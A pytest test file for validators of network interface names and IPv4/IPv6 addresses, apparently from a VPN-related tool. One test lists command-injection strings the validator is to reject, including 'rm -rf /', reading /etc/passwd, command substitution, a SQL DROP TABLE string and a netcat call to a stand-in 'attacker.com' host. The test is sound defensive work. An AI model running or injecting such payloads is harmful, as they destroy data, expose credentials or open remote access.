"""Tests for utils/validators.py - FIXED VERSION.

Tests input validation for interface names, IP addresses, and security checks.
Comprehensive coverage including edge cases, boundary values, and security scenarios.

FIXES APPLIED:
Added `: str` type annotation to all 26 parametrized test method arguments
- All `name` parameters now typed as `name: str`
- All `address` parameters now typed as `address: str`
- All `injection` parameters now typed as `injection: str`
"""

import pytest

from utils.validators import (
    is_valid_ip,
    is_valid_ipv4,
    is_valid_ipv6,
    validate_interface_name,
)


class TestValidateInterfaceName:
    """Tests for validate_interface_name function."""

    @pytest.mark.parametrize("name", [
        "eth0",
        "wlan0",
        "enp0s3",
        "wlp2s0",
        "eno1",
        "wlan1",
        "tun0",
        "tap0",
        "br0",
        "virbr0",
        "docker0",
        "pvpnksintrf0",
        "proton0",
    ])
    def test_valid_standard_names(self, name: str) -> None:
        """Test standard valid interface names."""
        assert validate_interface_name(name) is True

    @pytest.mark.parametrize("name", [
        "eth0.100",      # VLAN
        "eth0.4095",     # Maximum VLAN ID
        "eth0:1",        # Alias
        "eth0:255",      # Alias
        "eth0@if2",      # veth pair
        "br-1234abcd",   # Docker bridge
        "veth1234abc",   # Virtual Ethernet
        "docker_bridge", # Underscore
        "my_net.100",    # Combination
    ])
    def test_valid_special_characters(self, name: str) -> None:
        """Test valid special characters in interface names."""
        assert validate_interface_name(name) is True

    def test_valid_max_length(self) -> None:
        """Test maximum valid length (64 characters)."""
        assert validate_interface_name("a" * 64) is True
        assert validate_interface_name("eth" + "0" * 61) is True
        assert validate_interface_name("x" * 63 + "0") is True

    def test_valid_minimum_length(self) -> None:
        """Test minimum valid length (1 character)."""
        assert validate_interface_name("a") is True
        assert validate_interface_name("0") is True

    @pytest.mark.parametrize("name", [
        "",              # Empty string
        " ",             # Single space
        "   ",           # Multiple spaces
    ])
    def test_invalid_empty_or_whitespace(self, name: str) -> None:
        """Test empty or whitespace-only strings are invalid."""
        assert validate_interface_name(name) is False

    def test_invalid_too_long(self) -> None:
        """Test names over 64 characters are invalid."""
        assert validate_interface_name("a" * 65) is False
        assert validate_interface_name("a" * 100) is False
        assert validate_interface_name("eth" + "0" * 62) is False

    @pytest.mark.parametrize("name", [
        "eth 0",         # Space
        "eth/0",         # Slash
        "eth\\0",        # Backslash
        "eth'0",         # Single quote
        'eth"0',         # Double quote
        "eth\n0",        # Newline
        "eth\t0",        # Tab
        "eth\r0",        # Carriage return
        "eth*0",         # Asterisk
        "eth?0",         # Question mark
        "eth!0",         # Exclamation
        "eth#0",         # Hash
        "eth$0",         # Dollar
        "eth%0",         # Percent
        "eth^0",         # Caret
        "eth&0",         # Ampersand
        "eth=0",         # Equals
        "eth+0",         # Plus
        "eth[0",         # Left bracket
        "eth]0",         # Right bracket
        "eth{0",         # Left brace
        "eth}0",         # Right brace
        "eth<0",         # Less than
        "eth>0",         # Greater than
        "eth,0",         # Comma
        "eth;0",         # Semicolon
        "eth`0",         # Backtick
        "eth~0",         # Tilde
    ])
    def test_invalid_characters(self, name: str) -> None:
        """Test invalid characters are rejected."""
        assert validate_interface_name(name) is False

    @pytest.mark.parametrize("injection", [
        "eth0; rm -rf /",
        "eth0 && malicious",
        "eth0|cat /etc/passwd",
        "eth0||echo pwned",
        "../../../etc/passwd",
        "eth0`whoami`",
        "eth0$(whoami)",
        "eth0; echo $PATH",
        "'; DROP TABLE interfaces;--",
        "eth0\n/bin/bash",
        "eth0 & nc attacker.com 1234",
    ])
    def test_security_injection_attempts(self, injection: str) -> None:
        """Test command injection attempts are blocked."""
        assert validate_interface_name(injection) is False

    @pytest.mark.parametrize("name", [
        "café0",         # Non-ASCII
        "eth中文",        # Chinese characters
        "eth0\x00null",  # Null byte
        "eth0\x01ctrl",  # Control character
        "🔥eth0",        # Emoji
    ])
    def test_invalid_unicode_and_control(self, name: str) -> None:
        """Test non-ASCII and control characters are rejected."""
        assert validate_interface_name(name) is False


class TestIsValidIPv4:
    """Tests for is_valid_ipv4 function."""

    @pytest.mark.parametrize("address", [
        "192.168.1.1",
        "10.0.0.1",
        "172.16.0.1",
        "8.8.8.8",
        "1.1.1.1",
        "203.0.113.1",
        "198.51.100.1",
        "100.85.0.1",
        "10.42.0.1",
    ])
    def test_valid_standard_addresses(self, address: str) -> None:
        """Test standard valid IPv4 addresses."""
        assert is_valid_ipv4(address) is True

    @pytest.mark.parametrize("address", [
        "0.0.0.0",           # All zeros
        "255.255.255.255",   # All ones
        "127.0.0.1",         # Loopback
        "127.255.255.255",   # Loopback range end
        "169.254.0.0",       # Link-local
        "169.254.255.255",   # Link-local end
        "224.0.0.0",         # Multicast
        "239.255.255.255",   # Multicast end
    ])
    def test_valid_edge_cases(self, address: str) -> None:
        """Test edge case valid addresses."""
        assert is_valid_ipv4(address) is True

    def test_invalid_none(self) -> None:
        """Test None input is invalid."""
        assert is_valid_ipv4(None) is False

    @pytest.mark.parametrize("address", [
        "",
        " ",
        "   ",
    ])
    def test_invalid_empty_or_whitespace(self, address: str) -> None:
        """Test empty or whitespace strings are invalid."""
        assert is_valid_ipv4(address) is False

    @pytest.mark.parametrize("address", [
        "192.168.1",         # Too few octets
        "192.168",           # Too few octets
        "192",               # Too few octets
        "192.168.1.1.1",     # Too many octets
        "192.168.1.1.1.1",   # Too many octets
    ])
    def test_invalid_octet_count(self, address: str) -> None:
        """Test invalid octet counts are rejected."""
        assert is_valid_ipv4(address) is False

    @pytest.mark.parametrize("address", [
        "192.168.1.256",     # Octet > 255
        "192.168.1.999",     # Octet > 255
        "192.168.256.1",     # Second octet > 255
        "256.168.1.1",       # First octet > 255
        "192.168.1.-1",      # Negative octet
        "192.168.-1.1",      # Negative octet
        "-1.168.1.1",        # Negative first octet
    ])
    def test_invalid_octet_range(self, address: str) -> None:
        """Test out-of-range octets are rejected."""
        assert is_valid_ipv4(address) is False

    @pytest.mark.parametrize("address", [
        "192.168.1.a",       # Letter in octet
        "192.168.x.1",       # Letter in octet
        "a.b.c.d",           # All letters
        "192.168.1.1a",      # Letter suffix
        "192.168.1.0x10",    # Hex notation
    ])
    def test_invalid_non_numeric(self, address: str) -> None:
        """Test non-numeric octets are rejected."""
        assert is_valid_ipv4(address) is False

    @pytest.mark.parametrize("address", [
        "2001:db8::1",
        "::1",
        "fe80::1",
        "2607:f8b0:4004:814::200e",
    ])
    def test_invalid_ipv6_addresses(self, address: str) -> None:
        """Test IPv6 addresses are rejected."""
        assert is_valid_ipv4(address) is False

    @pytest.mark.parametrize("address", [
        "192.168. 1.1",      # Space in address
        "192.168.1 .1",      # Space in address
        "192 .168.1.1",      # Space in address
        " 192.168.1.1",      # Leading space
        "192.168.1.1 ",      # Trailing space
        "192.168.1.1\n",     # Newline
        "192.168.1.1\t",     # Tab
    ])
    def test_invalid_whitespace(self, address: str) -> None:
        """Test addresses with whitespace are rejected."""
        assert is_valid_ipv4(address) is False


class TestIsValidIPv6:
    """Tests for is_valid_ipv6 function."""

    @pytest.mark.parametrize("address", [
        "2001:db8::1",
        "::1",
        "fe80::1",
        "2607:f8b0:4004:814::200e",
        "2a07:b944::2:1",
        "2a07:b944::2:2",
        "fdeb:446c:912d:8da::",
        "2a02:6ea0:c501:6262::12",
    ])
    def test_valid_standard_addresses(self, address: str) -> None:
        """Test standard valid IPv6 addresses."""
        assert is_valid_ipv6(address) is True

    @pytest.mark.parametrize("address", [
        "fe80::1%eth0",
        "fe80::abcd:ef01:2345:6789%wlan0",
        "fe80::1%eno2",
        "fe80::1%1",
        "2001:db8::1%eth0",
    ])
    def test_valid_with_zone_identifier(self, address: str) -> None:
        """Test zone identifiers are stripped and address is valid."""
        assert is_valid_ipv6(address) is True

    @pytest.mark.parametrize("address", [
        "::",                       # All zeros
        "::1",                      # Loopback
        "::ffff:192.0.2.1",        # IPv4-mapped
        "::ffff:0:192.0.2.1",      # IPv4-mapped alternate
        "2001:db8::",              # Network prefix
        "2001:db8::8a2e:370:7334", # Full address compressed
        "fe80::",                  # Link-local prefix
        "ff00::",                  # Multicast prefix
    ])
    def test_valid_edge_cases(self, address: str) -> None:
        """Test edge case valid addresses."""
        assert is_valid_ipv6(address) is True

    def test_invalid_none(self) -> None:
        """Test None input is invalid."""
        assert is_valid_ipv6(None) is False

    @pytest.mark.parametrize("address", [
        "",
        " ",
        "   ",
    ])
    def test_invalid_empty_or_whitespace(self, address: str) -> None:
        """Test empty or whitespace strings are invalid."""
        assert is_valid_ipv6(address) is False

    @pytest.mark.parametrize("address", [
        "gggg::1",              # Invalid hex digit
        "zzzz::1",              # Invalid hex digit
        "2001:xyz::1",          # Invalid hex in group
        "2001:db8:12345::1",    # Group > 4 hex digits
    ])
    def test_invalid_hex_digits(self, address: str) -> None:
        """Test invalid hex digits are rejected."""
        assert is_valid_ipv6(address) is False

    @pytest.mark.parametrize("address", [
        "2001:db8::1::2",       # Double ::
        "::1::2",               # Double ::
        "2001::db8::1",         # Double ::
    ])
    def test_invalid_double_compression(self, address: str) -> None:
        """Test double :: compression is rejected."""
        assert is_valid_ipv6(address) is False

    @pytest.mark.parametrize("address", [
        "192.168.1.1",
        "8.8.8.8",
        "10.0.0.1",
    ])
    def test_invalid_ipv4_addresses(self, address: str) -> None:
        """Test IPv4 addresses are rejected."""
        assert is_valid_ipv6(address) is False

    def test_zone_identifier_stripping(self) -> None:
        """Test zone identifier is properly stripped before validation."""
        # Valid address with zone
        assert is_valid_ipv6("fe80::1%eth0") is True
        # Invalid address even with zone
        assert is_valid_ipv6("invalid::address::1%eth0") is False

    @pytest.mark.parametrize("address", [
        "fe80::1 ",             # Trailing space
        " fe80::1",             # Leading space
        "fe80 ::1",             # Space in address
        "fe80::1\n",            # Newline
        "fe80::1\t",            # Tab
    ])
    def test_invalid_whitespace(self, address: str) -> None:
        """Test addresses with whitespace are rejected."""
        assert is_valid_ipv6(address) is False


class TestIsValidIP:
    """Tests for is_valid_ip function."""

    @pytest.mark.parametrize("address", [
        "192.168.1.1",
        "10.0.0.1",
        "8.8.8.8",
        "127.0.0.1",
        "0.0.0.0",
        "255.255.255.255",
    ])
    def test_valid_ipv4(self, address: str) -> None:
        """Test IPv4 addresses are recognized."""
        assert is_valid_ip(address) is True

    @pytest.mark.parametrize("address", [
        "2001:db8::1",
        "::1",
        "fe80::1",
        "fe80::1%eth0",
        "2607:f8b0:4004:814::200e",
        "::",
    ])
    def test_valid_ipv6(self, address: str) -> None:
        """Test IPv6 addresses are recognized."""
        assert is_valid_ip(address) is True

    def test_invalid_none(self) -> None:
        """Test None input is invalid."""
        assert is_valid_ip(None) is False

    @pytest.mark.parametrize("address", [
        "",
        " ",
        "not an ip",
        "192.168",
        "gggg::1",
        "999.999.999.999",
        "hostname.example.com",
        "www.google.com",
    ])
    def test_invalid_format(self, address: str) -> None:
        """Test completely invalid formats are rejected."""
        assert is_valid_ip(address) is False

    @pytest.mark.parametrize("address", [
        "192.168.1.1",      # IPv4
        "2001:db8::1",      # IPv6
        "::1",              # IPv6 loopback
        "127.0.0.1",        # IPv4 loopback
        "fe80::1%eth0",     # IPv6 with zone
    ])
    def test_accepts_either_version(self, address: str) -> None:
        """Test function accepts both IPv4 and IPv6."""
        assert is_valid_ip(address) is True

    def test_rejects_both_invalid(self) -> None:
        """Test function rejects addresses invalid as both IPv4 and IPv6."""
        assert is_valid_ip("not.an.ip.address") is False
        assert is_valid_ip("999.999.999.999") is False
        assert is_valid_ip("gggg::1") is False
